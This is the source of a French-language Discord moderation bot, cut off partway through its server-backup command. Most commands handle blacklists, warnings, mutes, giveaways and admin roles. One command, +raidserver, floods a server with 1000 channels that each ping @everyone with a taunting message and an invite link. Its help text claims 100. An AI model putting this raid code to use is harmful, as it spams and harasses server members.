// Bot de gestion Discord
// Version : 1.0.0
// Auteur : Tarek.dev
// Description : Un bot de gestion pour Discord avec des fonctionnalités d'administration, de modération et de gestion de serveur.
// Licence : MIT

require('dotenv').config();

const { Client, GatewayIntentBits, PermissionsBitField, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, ChannelType, ActivityType } = require('discord.js');
const fs = require('fs');
const ms = require('ms');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessageReactions
  ]
});

const GUILD_ID = "1344588704769114135";

// Rôles VIP
const vipRoles = [
  "1344588704844349479",
  "1344588704844349477",
  "1344588704844349478"
];

client.once("ready", async () => {
  console.log(`Connecté en tant que ${client.user.tag}`);

  const updateVipCount = async () => {
    const guild = await client.guilds.fetch(GUILD_ID);
    await guild.members.fetch();

    let totalVips = 0;

    vipRoles.forEach(roleId => {
      const role = guild.roles.cache.get(roleId);
      if (role) {
        totalVips += role.members.size;
      }
    });

    const boosters = guild.members.cache.filter(member => member.premiumSince);
    const totalBoosters = boosters.size;

    client.user.setActivity(
      `${totalVips} VIP | ${totalBoosters} BOOSTERS`,
      { type: ActivityType.Watching } // Bot "regarde"
    );
  };

  // Mise à jour toutes les 60 secondes
  setInterval(updateVipCount, 60 * 1000);
  updateVipCount();
});

const vipRolesBoost = [
  "1344588704844349479",
  "1344588704844349478"
];

// Vérif si arrt de boost = enlève le vip
client.on("guildMemberUpdate", async (oldMember, newMember) => {
  if (oldMember.premiumSince && !newMember.premiumSince) {
    console.log(`${newMember.user.tag} a arrêté de booster.`);

    for (const roleId of vipRolesBoost) {
      if (newMember.roles.cache.has(roleId)) {
        try {
          await newMember.roles.remove(roleId, "A arrêté de booster");
          console.log(`Rôle VIP retiré à ${newMember.user.tag}`);
        } catch (err) {
          console.error(`Impossible de retirer le rôle VIP :`, err);
        }
      }
    }
  }
});

let blacklist = [];
if (fs.existsSync('blacklist.json')) {
  try {
    const raw = fs.readFileSync('blacklist.json', 'utf8');
    blacklist = JSON.parse(raw.length ? raw : '[]');
  } catch (err) {
    console.error("Erreur de lecture du fichier blacklist.json :", err.message);
    blacklist = [];
  }
}

let warns = {};
if (fs.existsSync('warns.json')) {
  try {
    const raw = fs.readFileSync('warns.json', 'utf8');
    warns = JSON.parse(raw.length ? raw : '{}');
  } catch (err) {
    console.error("Erreur de lecture du fichier warns.json :", err.message);
    warns = {};
  }
}

let lastGiveaway = null;
let activeGiveaway = null;

// Regroupement de toutes les commandes dans un seul bloc messageCreate
client.on('messageCreate', async message => {
  if (message.author.bot) return;

  if (blacklist.includes(message.author.id)) {
    return message.delete().catch(() => {});
  }

  async function safeReply(msg) {
    try {
        await message.reply(msg);
    } catch {
        try {
            await message.author.send(msg);
        } catch (e) {
            console.error("Impossible d'envoyer le message :", e);
        }
    }
    }

  // +bl userID raison
  if (message.content.startsWith('+bl')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply("Tu n'as pas les **permissions** pour **blacklist.**");
    }

    const args = message.content.split(' ');
    const userId = args[1];
    const reason = args.slice(2).join(' ') || "Non spécifiée";
    const serverName = message.guild.name;

    if (!userId) return message.reply("Tu dois fournir un **ID.**");

    if (blacklist.includes(userId)) {
      return message.reply("L'utilisateur est déjà **blacklisté.**");
    }

    blacklist.push(userId);

    try {
      fs.writeFileSync('blacklist.json', JSON.stringify(blacklist, null, 2));
    } catch (err) {
      console.error("Erreur d'écriture blacklist :", err.message);
      return message.reply("Erreur lors de la sauvegarde.");
    }

    try {
      const user = await client.users.fetch(userId);

      try {
        await user.send(`> Tu as été **blacklisté** du serveur **${serverName}** par **${message.author.tag}**.\n> - **Raison :** ${reason}`);
      } catch (err) {
        console.log(`Impossible d'envoyer un message privé à ${user.tag} (${userId}).`);
      }

      await message.channel.send(`> L'utilisateur **${user.tag}** a été **blacklisté.**\n> - **Raison :** ${reason}`);
    } catch {
      await message.channel.send(`> L'utilisateur (ID: ${userId}) a été **blacklisté.**\n> - **Raison :** ${reason}`);
    }

    try {
      const member = await message.guild.members.fetch(userId);
      if (member) {
        await member.ban({ reason: `Blacklisté par ${message.author.tag} : ${reason}` });
      }
    } catch (err) {
      console.log(`Erreur ban ou membre non trouvé : ${err.message}`);
    }
  }

  // +unbl userID
  if (message.content.startsWith('+unbl')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply("Tu n'as pas les permissions pour unblacklist.");
    }

    const args = message.content.split(' ');
    const userId = args[1];
    if (!userId) return message.reply("Tu dois fournir un ID.");

    if (!blacklist.includes(userId)) {
      return message.reply("ℹ L'utilisateur n'est pas dans la blacklist.");
    }

    blacklist = blacklist.filter(id => id !== userId);
    try {
      fs.writeFileSync('blacklist.json', JSON.stringify(blacklist, null, 2));
    } catch (err) {
      console.error("Erreur d'écriture blacklist :", err.message);
      return message.reply("Erreur lors de la suppression de la blacklist.");
    }

    try {
      const user = await client.users.fetch(userId);
      await message.channel.send(`> L'utilisateur **${user.tag}** a été retiré de la blacklist.`);
    } catch {
      await message.channel.send(`> L'utilisateur (ID: ${userId}) a été retiré de la blacklist.`);
    }

    try {
      await message.guild.bans.remove(userId, "Unblacklist via [+] TarekShop - Gestion");
    } catch (err) {
      console.log("Erreur unban :", err.message);
    }
  }

  // +infobl permet de voir les peronnes blacklistées
  if (message.content === '+infobl') {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply("Tu n'as pas les permissions pour voir la blacklist.");
    }

    if (blacklist.length === 0) {
      return message.channel.send("La blacklist est **vide.**");
    }

    const embed = new EmbedBuilder()
      .setColor(0xFF0000)
      .setTitle('Toutes les personnes Blacklist :')
      .setDescription(blacklist.map(id => `<@${id}> (ID: ${id})`).join('\n') || "Aucun utilisateur blacklisté.")
      .setFooter({ text: 'TarekShop - Gestion' })
      .setTimestamp();

    message.channel.send({ embeds: [embed] });
  }
  
  if (message.content === '+help') {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply("Tu n'as pas les **permissions** pour utiliser cette **commande.**");
    }

    const embed = new EmbedBuilder()
      .setColor('#ff0000')
      .setTitle('Commandes disponibles :')
      .setDescription(
        '**Général :**\n' +
        '> [ **+latence** ] - Affiche la latence du bot\n' +
        '> [ **+help** ] - Affiche cette aide\n\n' +

        '**Sauvegarde :**\n' +
        '> [ **+backupserver** ] - Sauvegarde le serveur dans un fichier JSON\n' +
        '> [ **+restorebackup [id]** ] - Restaure le serveur depuis une sauvegarde (fichier JSON)\n\n' +

        '**Giveaway :**\n' +
        '> [ **+giveawaystart "récompense" "durée" nombre_de_gagnants** ] - Démarre un giveaway\n' +
        '> [ **+giveawaycancel** ] - Annule le giveaway en cours\n' +
        '> [ **+giveawayreroll** ] - Relance le giveaway terminé\n\n' +

        '**Gestion utilisateurs :**\n' +
        '> [ **+admin @user** ] - Donne les permissions administrateur à un utilisateur\n' +
        '> [ **+unadmin @user** ] - Retire les permissions administrateur à un utilisateur\n' +
        '> [ **+userinfo @user** ] - Affiche les informations d\'un utilisateur\n' +
        '> [ **+warn @user raison** ] - Avertit un utilisateur avec une raison\n' +
        '> [ **+Warnings @user** ] - Affiche les avertissements d\'un utilisateur\n' +
        '> [ **+mute @user durée** ] - Mute un utilisateur (ex: `10m`, `2h`, `1j`)\n' +
        '> [ **+unmute @user** ] - Unmute un utilisateur\n' +
        '> [ **+bl userID** ] - Blacklist un utilisateur\n' +
        '> [ **+unbl userID** ] - Supprime un utilisateur de la blacklist\n' +
        '> [ **+infobl** ] - Affiche les utilisateurs blacklistés\n\n' +

        '**Gestion serveur :**\n' +
        '> [ **+raidserver** ] - Crée 100 salons de raid avec un message humoristique\n' +
        '> [ **+suppallsalon** ] - Supprime tous les salons du serveur (avec confirmation)\n' +
        '> [ **+clearsalon** ] - Supprime tous les messages du salon actuel\n\n' +

        '**Tests :**\n' +
        '> [ **+testwelcome** ] - Simule un message de bienvenue\n' +
        '> [ **+testbyebye** ] - Simule un message de bye-bye'
      )
      .setFooter({ text: `Demandé par ${message.author.tag}`, iconURL: message.author.displayAvatarURL() })
      .setTimestamp();

    return message.channel.send({ embeds: [embed] });
  }

  // +boost
  if (message.content === '+boost') {
    const boosters = message.guild.members.cache.filter(member => member.premiumSince);

    if (boosters.size === 0) {
      return message.reply("**Aucun boosteur sur ce serveur actuellement**");
    }

    const embed = new EmbedBuilder()
      .setTitle(`💎 Boosteurs du serveur (${boosters.size})`)
      .setColor("#F47FFF")
      .setDescription(boosters.map(m => `• ${m.user.tag}`).join("\n"))
      .setThumbnail(message.guild.iconURL())
      .setTimestamp()
      .setFooter({ text: "**Merci à tous les boosteurs !**" });

    message.channel.send({ embeds: [embed] });
  }

  // +latence
  if (message.content === '+latence') {
    const sent = await message.channel.send('⏱️ Calcul de la latence...');
    const latency = sent.createdTimestamp - message.createdTimestamp;
    const apiLatency = Math.round(client.ws.ping);

    const embed = new EmbedBuilder()
      .setColor('#22ff00')
      .setTitle('📶 Latence du Bot')
      .addFields(
        { name: 'Latence message', value: `${latency} ms`, inline: true },
        { name: 'Latence API', value: `${apiLatency} ms`, inline: true }
      )
      .setTimestamp();

    sent.edit({ content: null, embeds: [embed] });
  }

  // +raidserver
  if (message.content === '+raidserver') {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply("Tu n'as pas les permissions pour utiliser cette commande.");
    }
    const guild = message.guild;
    message.channel.send("Création de **1000** salons de raid en cours...");
    for (let i = 1; i <= 1000; i++) {
      guild.channels.create({
        name: `5154165174894944799487491-${i}`,
        type: 0
      }).then(channel => {
        channel.send("**Cheh fallait pas trash misteryou mogged by @29489383829100040** @everyone\n**JOIN LE SERV** : https://discord.gg/esWPGWUA5N");
      }).catch(console.error);
    }
    return;
  }

  // +userinfo @user
  if (message.content.startsWith('+userinfo')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply("Tu n'as pas les permissions pour utiliser cette commande.");
    }
    const args = message.content.trim().split(/ +/g);
    const userMention = args[1];
    if (!userMention) {
      return message.reply("Syntaxe : `+userinfo @user`");
    }
    const userId = userMention.replace(/[<@!>]/g, '');
    const member = await message.guild.members.fetch(userId).catch(() => null);
    if (!member) {
      return message.reply("Utilisateur introuvable sur le serveur.");
    }
    const embed = {
      color: 0x00ff00,
      title: `Informations sur ${member.user.tag}`,
      thumbnail: { url: member.user.displayAvatarURL() },
      fields: [
        { name: "Nom complet", value: `${member.user.tag}`, inline: true },
        { name: "ID", value: `${member.id}`, inline: true },
        { name: "Surnom", value: `${member.nickname || "Aucun"}`, inline: true },
        { name: "Compte créé le", value: `${member.user.createdAt.toLocaleString('fr-FR')}`, inline: true },
        { name: "Rejoint le serveur", value: `${member.joinedAt.toLocaleString('fr-FR')}`, inline: true },
        { name: "Rôles", value: `${member.roles.cache.map(r => r.name).filter(n => n !== "@everyone").join(", ") || "Aucun"}` }
      ],
      timestamp: new Date(),
      footer: { text: "TarekShop - Gestion" }
    };
    message.channel.send({ embeds: [embed] });
    return;
  }

  // +warn @user raison (version améliorée)
  if (message.content.startsWith('+warn')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply("Tu n'as pas les permissions pour warn.");
    }
    const args = message.content.trim().split(/\s+/);
    const userMention = args[1];
    const reason = args.slice(2).join(' ') || "Aucune raison fournie.";
    if (!userMention || !/^<@!?(\d+)>$/.test(userMention)) {
      return message.reply("Syntaxe : `+warn @user raison`");
    }
    const userId = userMention.match(/^<@!?(\d+)>$/)[1];
    const member = await message.guild.members.fetch(userId).catch(() => null);
    if (!member) return message.reply("Utilisateur introuvable sur le serveur.");
    if (member.user.bot) return message.reply("Tu ne peux pas warn un bot.");
    const warnEntry = {
      reason,
      warnedBy: message.author.tag,
      date: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })
    };
    if (!warns[userId]) warns[userId] = [];
    warns[userId].push(warnEntry);
    try {
      fs.writeFileSync('warns.json', JSON.stringify(warns, null, 2));
    } catch (err) {
      console.error("Erreur d'écriture warns.json :", err.message);
      return message.reply("Une erreur est survenue pendant la sauvegarde.");
    }
    message.channel.send(`${member.user.tag} a été **warn** pour : ${reason}`);
    return;
  }

  // +Warnings @user ou userID
  if (message.content.startsWith('+Warnings')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply("Tu n’as pas les permissions pour voir les avertissements.");
    }
    const args = message.content.trim().split(/ +/g);
    const userMentionOrId = args[1];
    if (!userMentionOrId) {
      return message.reply("Syntaxe : `+Warnings @user` ou `+Warnings userID`");
    }
    const userId = userMentionOrId.replace(/[<@!>]/g, '');
    const member = await message.guild.members.fetch(userId).catch(() => null);
    const userWarns = warns[userId];
    if (!userWarns || userWarns.length === 0) {
      return message.channel.send(`${member ? member.user.tag : `Utilisateur ${userId}`} n’a **aucun avertissement.**`);
    }
    const warningsList = userWarns
      .map((warn, i) => `#${i + 1} - ${warn.reason} (par ${warn.warnedBy}, le ${warn.date})`)
      .join('\n');
    message.channel.send(`Avertissements de ${member ? `<@${userId}>` : userId} :\n\n${warningsList}`);
    return;
  }

  // +clearsalon nombre
  if (message.content.startsWith('+clearsalon')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
      return message.channel.send("Tu n'as pas les **permissions** pour nettoyer le salon.");
    }

    const args = message.content.split(' ');
    let amount = parseInt(args[1]);

    if (!amount || isNaN(amount) || amount < 1) {
      return message.channel.send("Merci de préciser un nombre valide. Syntaxe : `+clearsalon 10`");
    }

    if (amount > 100) amount = 100; // Limite max Discord

    try {
      const fetchedMessages = await message.channel.messages.fetch({ limit: amount + 1 }); // +1 pour inclure le message de commande

      for (const [id, msg] of fetchedMessages) {
        await msg.delete();
      }

      const confirmMsg = await message.channel.send(`**Le salon a bien était clear ${amount} messages supprimés.**`);
    } catch (error) {
      console.error('Erreur lors de la suppression:', error);
      message.channel.send('**Une erreur est survenue lors de la suppression des messages.**');
    }
  }

  // +mute @user durée
  if (message.content.startsWith('+mute')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      const embed = new EmbedBuilder()
        .setColor('#C53030')
        .setTitle('Permission refusée')
        .setDescription('> Tu n’as pas les **permissions** nécessaires pour exécuter cette commande.');
      return message.reply({ embeds: [embed] });
    }
    const args = message.content.split(' ');
    const userMention = args[1];
    const durationRaw = args[2];
    if (!userMention || !durationRaw || !/^\d+(m|h|j)$/.test(durationRaw)) {
      const embed = new EmbedBuilder()
        .setColor('#ED8936')
        .setTitle('Syntaxe invalide')
        .setDescription([
          '> Syntaxe correcte : `+mute @user 10m | 2h | 1j`',
          '- `m` = minutes',
          '- `h` = heures',
          '- `j` = jours'
        ].join('\n'));
      return message.reply({ embeds: [embed] });
    }
    const userId = userMention.replace(/[<@!>]/g, '');
    const member = message.guild.members.cache.get(userId);
    if (!member) {
      const embed = new EmbedBuilder()
        .setColor('#E53E3E')
        .setTitle('Utilisateur introuvable')
        .setDescription('> Cet utilisateur ne se trouve pas sur ce serveur.');
      return message.reply({ embeds: [embed] });
    }
    let muteRole = message.guild.roles.cache.find(r => r.name.toLowerCase() === 'muted');
    if (!muteRole) {
      try {
        muteRole = await message.guild.roles.create({
          name: 'Muted',
          color: '#555555',
          reason: 'Rôle nécessaire pour les sanctions mute',
          permissions: []
        });
        const creationEmbed = new EmbedBuilder()
          .setColor('#2B6CB0')
          .setTitle('Rôle créé')
          .setDescription('> Le rôle **Muted** n’existait pas et a été créé automatiquement.');
        await message.channel.send({ embeds: [creationEmbed] });
        message.guild.channels.cache.forEach(channel => {
          if (channel.isTextBased?.() && channel.permissionOverwrites?.edit) {
            channel.permissionOverwrites.edit(muteRole, {
              SendMessages: false,
              AddReactions: false,
              Speak: false
            }).catch(() => {});
          }
        });
      } catch (error) {
        const errorEmbed = new EmbedBuilder()
          .setColor('#E53E3E')
          .setTitle('Erreur lors de la création du rôle')
          .setDescription('> Impossible de créer le rôle **Muted** automatiquement.');
        return message.reply({ embeds: [errorEmbed] });
      }
    }
    const timeValue = parseInt(durationRaw);
    const timeUnit = durationRaw.slice(-1).toLowerCase();
    let durationMs = 0;
    let unitLabel = '';
    switch (timeUnit) {
      case 'm':
        durationMs = timeValue * 60 * 1000;
        unitLabel = 'minute(s)';
        break;
      case 'h':
        durationMs = timeValue * 60 * 60 * 1000;
        unitLabel = 'heure(s)';
        break;
      case 'j':
        durationMs = timeValue * 24 * 60 * 60 * 1000;
        unitLabel = 'jour(s)';
        break;
      default:
        const embed = new EmbedBuilder()
          .setColor('#ED8936')
          .setTitle('Unité de temps invalide')
          .setDescription('> Utilise `m`, `h` ou `j` comme unité de temps.');
        return message.reply({ embeds: [embed] });
    }
    message.guild.channels.cache.forEach(channel => {
      try {
        if (channel.isTextBased?.() && channel.permissionOverwrites?.edit) {
          channel.permissionOverwrites.edit(muteRole, {
            SendMessages: false,
            AddReactions: false,
            Speak: false
          }).catch(() => {});
        }
      } catch {}
    });
    if (member.roles.cache.has(muteRole.id)) {
      const embed = new EmbedBuilder()
        .setColor('#ECC94B')
        .setTitle('Déjà mute')
        .setDescription('> Cet utilisateur est déjà **mute**.');
      return message.reply({ embeds: [embed] });
    }
    try {
      await member.roles.add(muteRole);
      const embed = new EmbedBuilder()
        .setColor('#2B6CB0')
        .setTitle('Utilisateur mute')
        .setDescription([
          `> ${member.user.tag} a été mute.`,
          `- Durée : **${timeValue} ${unitLabel}**`
        ].join('\n'));
      message.channel.send({ embeds: [embed] });
      setTimeout(async () => {
        const freshMember = await message.guild.members.fetch(member.id).catch(() => null);
        if (freshMember && freshMember.roles.cache.has(muteRole.id)) {
          await freshMember.roles.remove(muteRole);
          const unmuteEmbed = new EmbedBuilder()
            .setColor('#38A169')
            .setTitle('Unmute automatique')
            .setDescription([
              `> ${freshMember.user.tag} a été automatiquement unmute.`,
              `- Durée écoulée : **${timeValue} ${unitLabel}**`
            ].join('\n'));
          message.channel.send({ embeds: [unmuteEmbed] });
        }
      }, durationMs);
    } catch (err) {
      console.error("Erreur lors du mute :", err.message);
      const embed = new EmbedBuilder()
        .setColor('#E53E3E')
        .setTitle('Erreur')
        .setDescription('> Une erreur est survenue lors du mute.');
      message.reply({ embeds: [embed] });
    }
    return;
  }

  // +unmute @user
  if (message.content.startsWith('+unmute')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply("Tu n'as pas les **permissions** pour **unmute.**");
    }
    const args = message.content.split(' ');
    const userMention = args[1];
    if (!userMention) return message.reply("Syntaxe : `+unmute @user`.");
    const userId = userMention.replace(/[<@!>]/g, '');
    const member = message.guild.members.cache.get(userId);
    if (!member) return message.reply("Utilisateur introuvable sur le serveur.");
    const muteRole = message.guild.roles.cache.find(r => r.name.toLowerCase() === 'muted');
    if (!muteRole) return message.reply("Le rôle **muted** n'existe pas.");
    if (!member.roles.cache.has(muteRole.id)) {
      return message.reply("Cet utilisateur n'est pas mute.");
    }
    try {
      await member.roles.remove(muteRole);
      message.channel.send(`${member.user.tag} a été **unmute** avec **succès.**`);
    } catch (err) {
      console.error("Erreur lors du unmute :", err.message);
      message.reply("Une erreur est survenue lors du unmute.");
    }
    return;
  }

  // +admin @user
  if (message.content.startsWith('+admin')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply("Tu n'as pas les **permissions** pour utiliser cette commande.");
    }
    const target = message.mentions.members.first();
    if (!target) {
      return message.reply("Tu dois mentionner un utilisateur. Exemple : `+admin @user`");
    }
    try {
      let adminRole = message.guild.roles.cache.find(r => r.name === 'permAdmin');
      if (!adminRole) {
        adminRole = await message.guild.roles.create({
          name: 'permAdmin',
          color: 'Red',
          permissions: [PermissionsBitField.Flags.Administrator],
          reason: 'Rôle créé par la commande **+admin**',
        });
      }
      await target.roles.add(adminRole);
      message.channel.send(`${target} a reçu les permissions **administrateur.**`);
    } catch (err) {
      console.error(err);
      message.channel.send("Une erreur est survenue lors de l'ajout du rôle.");
    }
    return;
  }

  // +unadmin @user
  if (message.content.startsWith('+unadmin')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply("Tu n'as pas les **permissions** pour utiliser cette **commande.**");
    }
    const target = message.mentions.members.first();
    if (!target) {
      return message.reply("Tu dois mentionner un utilisateur. Exemple : `+unadmin @user`");
    }
    const adminRole = message.guild.roles.cache.find(r => r.name === 'permAdmin');
    if (!adminRole) {
      return message.reply("Le rôle `permAdmin` **n'existe pas** sur le serveur.");
    }
    if (!target.roles.cache.has(adminRole.id)) {
      return message.reply("Cet utilisateur n'a pas le rôle `permAdmin`.");
    }
    try {
      await target.roles.remove(adminRole);
      message.channel.send(`Le rôle **administrateur** a été **retiré** à ${target}.`);
    } catch (err) {
      console.error(err);
      message.channel.send("Une erreur est survenue lors du retrait du rôle.");
    }
    return;
  }

  // +suppallsalon
  if (message.content === '+suppallsalon') {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply("Tu n'as pas les **permissions** pour supprimer tous les salons.");
    }
    const embed = new EmbedBuilder()
      .setColor(0xFF0000)
      .setTitle('Confirmation requise')
      .setDescription('Cette commande va supprimer **TOUS les salons** du serveur.\n\nClique sur **Confirmer** pour valider ou **Annuler** pour stopper.')
      .setFooter({ text: 'Attention, cette action est **irréversible !**' })
      .setTimestamp();
    const row = new ActionRowBuilder()
      .addComponents(
        new ButtonBuilder()
          .setCustomId('confirm_delete')
          .setLabel('Confirmer')
          .setStyle(ButtonStyle.Danger),
        new ButtonBuilder()
          .setCustomId('cancel_delete')
          .setLabel('Annuler')
          .setStyle(ButtonStyle.Secondary)
      );
    message.channel.send({ embeds: [embed], components: [row] }).then(sentMessage => {
      const filter = i => i.user.id === message.author.id;
      const collector = sentMessage.createMessageComponentCollector({ filter, time: 30000 });
      collector.on('collect', async i => {
        if (i.customId === 'confirm_delete') {
          const embedDeleting = new EmbedBuilder()
            .setColor(0xFF0000)
            .setTitle('# Suppression en cours')
            .setDescription('Suppression de tous les salons du serveur...')
            .setTimestamp();
          await i.update({ embeds: [embedDeleting], components: [] });
          message.guild.channels.cache.forEach(channel => {
            channel.delete().catch(err => console.error(`Erreur suppression salon ${channel.name} :`, err));
          });
          collector.stop();
        } else if (i.customId === 'cancel_delete') {
          const embedCancel = new EmbedBuilder()
            .setColor(0xFF0000)
            .setTitle('# Suppression annulée')
            .setDescription('La suppression des salons a été **annulée.**')
            .setTimestamp();
          await i.update({ embeds: [embedCancel], components: [] });
          collector.stop();
        }
      });
      collector.on('end', collected => {
        if (collected.size === 0) {
          const embedTimeout = new EmbedBuilder()
            .setColor(0xFFFF00)
            .setTitle('# Temps écoulé')
            .setDescription('**Aucune réponse reçue, suppression annulée.**')
            .setTimestamp();
          sentMessage.edit({ embeds: [embedTimeout], components: [] });
        }
      });
    });
    return;
  }

  // +giveawaystart
  if (message.content.startsWith('+giveawaystart')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply("Tu n'as pas les **permissions** pour ça.");
    }

    if (activeGiveaway) return message.reply("**Un giveaway est déjà en cours.**");

    const args = message.content.match(/"([^"]+)"\s+"([^"]+)"\s+(\d+)/);
    if (!args) {
      return message.reply("Syntaxe : `+giveawaystart \"récompense\" \"durée\" nombre_de_gagnants`");
    }

    const reward = args[1];
    const durationStr = args[2];
    const winnersCount = parseInt(args[3]);
    const durationMs = ms(durationStr);

    if (!durationMs || isNaN(winnersCount) || winnersCount < 1) {
      return message.reply("Format invalide.");
    }

    const endTime = Date.now() + durationMs;

    const embed = new EmbedBuilder()
      .setTitle("🛍️ Giveaway lancé !")
      .setDescription(`> Récompense : **${reward}**\n> Gagnant(s) : **${winnersCount}**\n> **Clique sur le bouton pour participer !**`)
      .setColor(0xFF0000)
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('participer_giveaway')
        .setLabel('🎉 Participer')
        .setStyle(ButtonStyle.Success),
      new ButtonBuilder()
        .setCustomId('voir_participants')
        .setLabel('👀 Voir participants')
        .setStyle(ButtonStyle.Secondary)
    );

    const giveawayMsg = await message.channel.send({ embeds: [embed], components: [row] });

    const participants = new Set();

    // MP à tous les membres avec embed
    try {
      const members = await message.guild.members.fetch();
      members.forEach(member => {
        if (!member.user.bot) {
          const dmEmbed = new EmbedBuilder()
          .setTitle("Nouveau Giveaway ! / New Giveaway!")
          .setDescription(
            `🇫🇷 Un **Giveaway** vient de commencer sur **${message.guild.name}** !\n` +
            `> - Récompense : **${reward}**\n` +
            `> - Gagnant(s) : **${winnersCount}**\n` +
            `> - Fin : **<t:${Math.floor(endTime / 1000)}:R>**\n\n` +
            `🇬🇧 A **Giveaway** just started on **${message.guild.name}**!\n` +
            `> - Reward: **${reward}**\n` +
            `> - Winner(s): **${winnersCount}**\n` +
            `> - Ends: **<t:${Math.floor(endTime / 1000)}:R>**\n\n` +
            `➡️ 🇫🇷/🇬🇧 To participate, click the button in the channel: <#${message.channel.id}>`
          )
          .setColor(0xFF0000) // couleur rouge
          .setFooter({ text: `Organisé par / Hosted by ${message.member.displayName}` })
          .setTimestamp();

          member.send({ embeds: [dmEmbed] }).catch(() => {});
        }
      });
    } catch (err) {
      console.log("Erreur lors de l'envoi des messages privés :", err.message);
    }

    const collector = giveawayMsg.createMessageComponentCollector({
      componentType: 2,
      time: durationMs
    });

    collector.on('collect', interaction => {
      if (interaction.customId === 'participer_giveaway') {
        if (participants.has(interaction.user.id)) {
          interaction.reply({ content: "**Attention tu participes déjà !**", flags: 64 });
        } else {
          participants.add(interaction.user.id);
          interaction.reply({ content: "**Participation enregistrée !**", flags: 64 });
        }
      }

      if (interaction.customId === 'voir_participants') {
        if (participants.size === 0) {
          return interaction.reply({ content: "> **Aucun participant pour l'instant.**", flags: 64 });
        }

        const list = Array.from(participants)
          .map(id => `> - <@${id}>`)
          .join('\n');

        interaction.reply({
          content: `> **Participants actuels (${participants.size}) :**\n${list}`,
          flags: 64
        });
      }
    });

    collector.on('end', async () => {
      row.components[0].setDisabled(true);
      await giveawayMsg.edit({ components: [row] });

      if (participants.size === 0) {
        message.channel.send("Giveaway **terminé**. Aucun participant...");
      } else {
        const shuffled = Array.from(participants).sort(() => 0.5 - Math.random());
        const winners = shuffled.slice(0, winnersCount);
        const endEmbed = new EmbedBuilder()
        .setTitle("🛍️ Fin du Giveaway !")
        .setDescription(
          `> **Gagnant(s) :** ${winners.map(id => `<@${id}>`).join(', ')}\n` +
          `> Participants : **${participants.size}**\n` +
          `> Récompense : **${reward}**\n` +
          `> Fin : <t:${Math.floor(endTime / 1000)}:R>\n\n` +
          `> Merci à tous d'avoir participé !`
        )
        .setColor(0xFF0000) // couleur Rouge
        .setTimestamp();
        message.channel.send({ embeds: [endEmbed] });
        
        for (const id of winners) {
          
          try {
            const winnerUser = await client.users.fetch(id);
            
            const winEmbed = new EmbedBuilder()
            .setTitle("Tu as gagné le Giveaway !")
            .setDescription(`> Félicitations <@${id}> ! Tu as remporté le **giveaway** organisé sur **${message.guild.name}**.`)
            .addFields(
              { name: "> Récompense", value: reward, inline: false }
            )
            .setColor(0xFF0000) // couleur Rouge
            .setTimestamp()
            .setFooter({ text: "Merci d’avoir participé !" });
            await winnerUser.send({ embeds: [winEmbed] });
          } catch {}
        }

        lastGiveaway = {
          participants: Array.from(participants),
          reward,
          winnersCount,
          winners
        };
      }

      activeGiveaway = null;
    });

    activeGiveaway = {
      message: giveawayMsg,
      participants,
      reward,
      winnersCount,
      collector,
      hostChannel: message.channel
    };

    return;
  }

  // +giveawaycancel
  if (message.content === '+giveawaycancel') {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply("Tu n'as pas les **permissions.**");
    }

    if (!activeGiveaway) return message.reply("**Aucun giveaway en cours.**");

    activeGiveaway.collector.stop('cancelled');
    activeGiveaway.message.edit({
      embeds: [EmbedBuilder.from(activeGiveaway.message.embeds[0]).setTitle('**Giveaway annulé**').setColor(0xFF0000)],
      components: []
    });

    message.channel.send("**Giveaway annulé.**");
    activeGiveaway = null;
    return;
  }

  // +giveawayreroll
  if (message.content === '+giveawayreroll') {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply("Tu n'as pas les **permissions pour faire cette commande**.");
    }

    if (!lastGiveaway || !lastGiveaway.participants.length) {
      return message.reply("Aucun giveaway terminé à relancer.");
    }

    const remainingParticipants = lastGiveaway.participants.filter(id => !lastGiveaway.winners.includes(id));

    if (remainingParticipants.length === 0) {
      return message.reply("**Pas assez de participants pour un nouveau tirage.**");
    }

    const shuffled = remainingParticipants.sort(() => 0.5 - Math.random());
    const newWinners = shuffled.slice(0, lastGiveaway.winnersCount);

    message.channel.send(`# Nouveau tirage !\n> Félicitations à ${newWinners.map(id => `<@${id}>`).join(', ')} pour **${lastGiveaway.reward}** !`);

    lastGiveaway.winners = newWinners;
  }

  // +backupserver
  if (message.content === '+backupserver') {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply("Tu n'as pas les **permissions** pour utiliser cette commande.");
    }

    const guild = message.guild;
    const backup = {
      name: guild.name,
      id: guild.id.toString(),
      icon: guild.iconURL({ dynamic: true }),
      ownerId: guild.ownerId,
      premiumTier: guild.premiumTier,
      premiumSubscriptionCount: guild.premiumSubscriptionCount,
      roles: [],
      channels: []
    };

    guild.roles.cache
      .filter(role => role.name !== '@everyone')
      .sort((a, b) => b.position - a.position)
      .forEach(role => {
        backup.roles.push({
